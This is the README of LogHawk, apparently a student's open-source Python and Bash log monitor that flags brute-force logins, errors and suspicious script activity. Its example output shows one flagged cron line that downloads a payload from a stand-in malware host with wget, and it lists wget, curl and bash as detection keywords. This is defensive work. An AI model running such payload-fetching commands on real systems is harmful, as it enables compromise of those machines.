
# 🦅 LogHawk

LogHawk is a lightweight, open-source log monitoring tool built in both Python and Bash. It automates the detection of suspicious activity in system and web logs, helping security teams identify threats like brute-force attacks, critical errors, and malicious scripts before they become incidents. It scans system and application logs for:

- 🛑 Failed login attempts
- ⚠️ Unusual traffic spikes
- 🔥 Critical system errors
- 🦠 Suspicious script activity


## ⚙️ Installation
Before using LogHawk, make sure you have Python 3 installed. You can install it by running: 

```bash
sudo apt-get install python3
```
Clone the repo and make scripts executable:
```bash
git clone https://github.com/Lintageorge7/LogHawk.git
cd LogHawk
chmod +x loghawk.sh
chmod +x loghawk.py
```
## 🐍 Usage (Python)

```bash
python3 loghawk.py Sample_logs/auth.log
```

## 📤 Example Output
```bash
[🔐] Detecting failed logins...
⚠️  6 failed login attempts from 192.168.1.101
[🌐] Detecting traffic spikes...
[🔥] Detecting system errors...
❗ Jul 14 08:14:30 systemd[1]: ERROR - Disk full
❗ Jul 14 08:14:45 app[1001]: CRITICAL - Kernel panic
[🦠] Detecting suspicious script activity...
🚩 Suspicious: Jul 14 08:14:01 cron[5678]: (root) CMD (wget http://malware.site/payload.sh)
```

## 💻 Usage (Bash)
```bash
./loghawk.sh Sample_logs/system.log
```

## 📸 Sample Output Screenshot

[screenshots/sample_bashoutput.png](https://github.com/Lintageorge7/LogHawk/blob/84d22923e3ce9c1e7a784bde5d43baba02d11bb3/screenshots/sample_bashoutput.png)

[screenshots/sample_output.png](https://github.com/Lintageorge7/LogHawk/blob/440c080892cf81e7c78bf9436885271717ce1739/screenshots/sample_output.png)

## 🧠 Threats Detected
LogHawk currently detects:

 • 🔐 Failed Login Attempts — Flags 5+ failed logins per IP (MITRE T1110)

 • 🔥 Critical System Errors — Catches “ERROR” and “CRITICAL” entries in logs

 • 🦠 Suspicious Script Activity — Identifies malicious command use (wget, curl, bash)

 • 🌐 Traffic Spikes — High request volume from single IPs (future iteration)

All detections act as potential Indicators of Compromise (IoCs).

## ⏱️ Automation Setup

### 🐧 Linux (Cron)
Run every 10 minutes:
```bash
crontab -e
*/10 * * * * /home/student/LogHawk/loghawk.sh /var/log/auth.log
```

## 🪟 Windows: Task Scheduler

To schedule LogHawk on Windows:

1. Open Task Scheduler → Create Basic Task

2. Trigger: Every 10 minutes

3. Action: Start a program
    
 •  Program: python

 •  Arguments: C:\path\to\loghawk.py C:\logs\auth.log

## 📂 Project Structure

```bash
LogHawk/

├── loghawk.py        # Python version
├── loghawk.sh        # Bash version
├── sample_logs/      # Test log files
├── screenshots/      # Images for report/README
├── README.md         # This file
└── LogHawk_Report.md # Final report (optional: .pdf)
```

## 🧪 Sample Logs

Sample logs are located in the sample_logs/ folder for testing:

• auth.log

• access.log

• system.log


## 🔄 Future Improvements
 
 • Email/SMS alerting

 • Log filtering thresholds

 • JSON/CSV export

 • Web UI dashboard

 • Integration with ELK or Splunk

## 📚 References

 • MITRE ATT&CK: https://attack.mitre.org/ 

 • NIST Log Management Guidelines: https://csrc.nist.gov/publications 

 • Red Hat: Log Files and Monitoring: https://access.redhat.com 

## 🤝 Contributing
Pull requests are welcome. If you have improvements or new detection rules, feel free to contribute!

## 📄 License
This project is licensed under the MIT License.

## 👩‍💻 Author
Linta Susan George
Cybersecurity Student @ Lighthouse Labs | 🇨🇦
